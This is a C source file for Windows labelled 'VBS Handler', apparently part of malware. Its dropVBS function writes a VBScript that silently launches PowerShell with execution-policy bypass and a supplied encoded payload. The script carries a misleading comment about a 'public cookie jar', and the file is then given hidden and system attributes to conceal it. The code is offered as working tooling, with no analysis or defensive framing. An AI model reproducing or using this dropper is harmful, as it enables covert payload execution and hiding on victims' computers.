/*
VBS Handler
author: Bryant Chang
*/
#include <stdio.h>
#include <windows.h>
#include "../winconsts.h"

int hasVBS() {
    DWORD fileattr = GetFileAttributesA(VBS_PATH);
    return (fileattr != INVALID_FILE_ATTRIBUTES && !(fileattr & FILE_ATTRIBUTE_DIRECTORY));
}
int dropVBS(const char* encodedPayload) {
	FILE* vbs = fopen(VBS_PATH, "w");
	HKEY hKey;
	char powershellCmd[4096];
	snprintf(powershellCmd, sizeof(powershellCmd), "powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand %s", encodedPayload);
    if (vbs) {
        fprintf(vbs, "' This is the public cookie jar for initializing all users. For sustainable cookie logic.\n"
			"CreateObject(\"WScript.Shell\").Run \"%s\", 0, False", powershellCmd);
        fclose(vbs);
		SetFileAttributesA(VBS_PATH, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
}